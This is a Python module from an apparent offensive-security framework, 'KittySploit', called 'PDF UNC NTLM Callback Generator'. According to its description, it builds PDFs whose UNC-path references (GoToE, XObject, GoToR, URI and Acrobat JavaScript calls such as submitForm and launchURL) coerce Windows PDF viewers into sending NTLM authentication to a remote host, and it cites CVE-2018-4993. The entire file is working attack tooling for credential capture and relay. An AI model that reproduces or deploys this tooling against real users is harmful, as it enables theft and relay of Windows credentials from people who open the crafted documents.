#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfPhonehomeMixin, format_test_ids
from lib.pdf.generators.actions import write_gotoe_unc
from lib.pdf.generators.unc import write_unc_xobject, write_unc_gotor, write_unc_thread, write_unc_uri, write_unc_js_submit_form, write_unc_js_get_url, write_unc_js_launch_url, write_unc_js_soap, write_unc_js_open_doc


class Module(Auxiliary, PdfPhonehomeMixin):
    __info__ = {
        "name": "PDF UNC NTLM Callback Generator",
        "description": (
            "Generate PDFs that reference UNC paths to coerce NTLM authentication "
            "from Windows PDF viewers. Covers GoToE, XObject streams, GoToR, Thread, "
            "URI actions, and Acrobat JavaScript APIs (submitForm, getURL, launchURL, "
            "SOAP, openDoc)."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://github.com/RUB-NDS/PDF101",
            "https://github.com/deepzec/Bad-Pdf",
            "https://nvd.nist.gov/vuln/detail/CVE-2018-4993",
        ],
        "tags": ["pdf", "unc", "ntlm", "relay", "windows", "callback"],
    }

    PDF_GENERATORS = (
        write_gotoe_unc,
        write_unc_xobject,
        write_unc_gotor,
        write_unc_thread,
        write_unc_uri,
        write_unc_js_submit_form,
        write_unc_js_get_url,
        write_unc_js_launch_url,
        write_unc_js_soap,
        write_unc_js_open_doc,
    )

    MODULE_TITLE = "PDF UNC NTLM callback generator"

    def run(self):
        print_info(f"    Test ids: {format_test_ids(self.PDF_GENERATORS)}")
        return self.run_pdf_phonehome()